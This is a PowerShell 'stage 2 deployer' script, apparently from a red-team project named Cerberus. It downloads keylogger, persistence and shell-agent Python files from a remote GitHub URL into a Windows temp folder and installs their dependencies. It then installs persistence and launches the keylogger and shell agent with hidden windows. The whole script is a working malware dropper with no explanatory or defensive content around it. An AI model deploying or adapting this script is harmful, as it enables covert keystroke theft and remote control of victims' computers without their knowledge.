# Project Cerberus - Stage 2 Deployer (STEALTH)

$dir  = "C:\Windows\Temp\cerberus"
$base = "https://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/refs/heads/master/red-team/keylogger"
$log  = "C:\Windows\Temp\cerberus_deploy.log"

function Log($msg) {
    "[$(Get-Date -Format 'HH:mm:ss')] $msg" | Out-File $log -Append
}

Log "Deploy started"

New-Item -ItemType Directory -Force -Path $dir | Out-Null
Log "Directory ready"

Invoke-WebRequest -Uri "$base/config.py"        -OutFile "$dir\config.py"        -UseBasicParsing | Out-Null
Log "Downloaded: config.py"
Invoke-WebRequest -Uri "$base/keylogger.py"     -OutFile "$dir\keylogger.py"     -UseBasicParsing | Out-Null
Log "Downloaded: keylogger.py"
Invoke-WebRequest -Uri "$base/persistence.py"   -OutFile "$dir\persistence.py"   -UseBasicParsing | Out-Null
Log "Downloaded: persistence.py"
Invoke-WebRequest -Uri "$base/shell_agent.py"   -OutFile "$dir\shell_agent.py"   -UseBasicParsing | Out-Null
Log "Downloaded: shell_agent.py"
Invoke-WebRequest -Uri "$base/requirements.txt" -OutFile "$dir\requirements.txt" -UseBasicParsing | Out-Null
Log "Downloaded: requirements.txt"

$pynputCheck = python -c "import pynput" 2>&1
if ($LASTEXITCODE -ne 0) {
    Log "Running pip install..."
    pip install -r "$dir\requirements.txt" -q 2>&1 | Out-Null
    Log "pip install done"
} else {
    Log "Dependencies already installed, skipping pip"
}

python "$dir\persistence.py" 2>&1 | Out-Null
Log "Persistence installed"

Start-Process pythonw -ArgumentList "$dir\shell_agent.py" -WorkingDirectory $dir -WindowStyle Hidden
Log "shell_agent launched"

Start-Process pythonw -ArgumentList "$dir\keylogger.py" -WorkingDirectory $dir -WindowStyle Hidden
Log "keylogger launched"

Log "Deploy complete"
